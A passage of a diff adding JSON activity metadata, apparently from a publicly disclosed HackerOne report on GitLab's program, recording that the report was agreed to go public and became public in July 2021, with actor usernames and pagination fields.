+      "actor": {
+        "username": "dcouture",
+        "cleared": false,
+        "verified": false,
+        "url": "/dcouture",
+        "profile_picture_urls": {
+          "medium": "https://profile-photos.hackerone-user-content.com/variants/TpSJ356VRAW7GpCzzZ25R8Kb/5136ed9b2fa7c4d4abbf39fb971047c62d98ec4740a88eb55d7e26373250a937"
+        },
+        "hackerone_triager": false,
+        "hackerone_employee": false
+      },
+      "genius_execution_id": null,
+      "team_handle": "gitlab"
+    },
+    {
+      "id": 12460812,
+      "is_internal": false,
+      "editable": false,
+      "type": "Activities::AgreedOnGoingPublic",
+      "message": "",
+      "automated_response": false,
+      "created_at": "2021-07-12T23:00:30.593Z",
+      "updated_at": "2021-07-12T23:00:30.593Z",
+      "actor": {
+        "username": "taraszelyk",
+        "cleared": false,
+        "verified": false,
+        "url": "/taraszelyk",
+        "profile_picture_urls": {
+          "medium": "/assets/avatars/default-25f7248a18bdf9e2dc8310319b148d66cff430fa0fade6c5f25fee1b8d7f27ed.png"
+        },
+        "hackerone_triager": false,
+        "hackerone_employee": false
+      },
+      "genius_execution_id": null,
+      "team_handle": "gitlab"
+    },
+    {
+      "id": 12460813,
+      "is_internal": false,
+      "editable": false,
+      "type": "Activities::ReportBecamePublic",
+      "message": "",
+      "automated_response": false,
+      "created_at": "2021-07-12T23:00:30.758Z",
+      "updated_at": "2021-07-12T23:00:30.758Z",
+      "actor": {
+        "username": "taraszelyk",
+        "cleared": false,
+        "verified": false,
+        "url": "/taraszelyk",
+        "profile_picture_urls": {
+          "medium": "/assets/avatars/default-25f7248a18bdf9e2dc8310319b148d66cff430fa0fade6c5f25fee1b8d7f27ed.png"
+        },
+        "hackerone_triager": false,
+        "hackerone_employee": false
+      },
+      "genius_execution_id": null,
+      "team_handle": "gitlab"
+    }
+  ],
+  "activity_page_count": 1,
+  "activity_page_number": 1,
+  "summaries": [
+    {
+      "category": "team",
+      "can_view?": true,
+      "can_create?": false
+    },
+    {
+      "category": "researcher",
+      "can_view?": true,
+      "can_create?": false
+    }
+  ]
+}
